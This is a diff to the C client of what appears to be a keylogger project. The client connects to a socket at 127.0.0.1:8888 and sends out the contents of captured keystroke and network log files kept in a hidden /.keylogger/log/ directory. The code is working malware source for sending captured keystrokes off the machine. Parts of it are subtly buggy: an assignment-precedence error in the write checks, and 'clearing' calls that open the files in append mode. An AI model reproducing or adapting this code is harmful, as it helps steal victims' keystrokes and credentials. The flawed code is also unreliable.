@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
-
+#include  <fcntl.h>
 #include "client.h"
 
 #define BUFFER_SIZE 4096
@@ -8,10 +8,9 @@
 void start_client(void)
 {
     // Variables
-    int sock, read_size, ret;
+    int sock, ret;
     struct sockaddr_in server;
     char send_buffer[BUFFER_SIZE];
-    struct stat stat_buf;
     
     char *addr = "127.0.0.1";  // localhost
     short port = 8888;
@@ -43,37 +42,34 @@ void start_client(void)
         
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open keylog file for writing*/
-        FILE *keylog_log = fopen("log/keylog.txt", "r");
+        FILE *keylog_log = fopen("/.keylogger/log/keylog_received.txt", "r");
         /*Write keylog file*/
         while(fscanf(keylog_log,"%s",send_buffer) != EOF)
         {
-            fscanf(keylog_log,"%s",send_buffer);
-            ret = write(sock, &send_buffer, sizeof(send_buffer));
-            if(ret <=0){
+            if(ret = write(sock, send_buffer, sizeof(send_buffer))<=0){
                 perror("Error writing keylog log\n");
                 close(sock);
                 exit(0);
             }
         }
         /*Clear and close keylog file*/
-        fclose(fopen("log/keylog.txt");
+        fclose(fopen("/.keylogger/log/keylog.txt", "a"));
         sleep(5);
                
         memset(send_buffer, 0, sizeof(send_buffer));  //clear send buffer
         /*Open network_log file for writing*/
-        FILE *network_log = fopen("log/network.txt", "r");
+        FILE *network_log = fopen("/.keylogger/log/network_received.txt", "r");
         /*Write keylog file*/
         while(fscanf(network_log,"%s",send_buffer) != EOF)
         {
-            ret = write(sock, &send_buffer, sizeof(send_buffer));
-            if(ret <=0){
+            if(ret = (write(sock, send_buffer, sizeof(send_buffer))<=0)){
                 perror("Error writing network log\n");
                 close(sock);
                 exit(0);
             }
         }
         /*Clear and close keylog file*/
-        fclose(fopen("log/network.txt"));
+        fclose(fopen("/.keylogger/log/network.txt", "a"));
     }
     close(sock);
 }
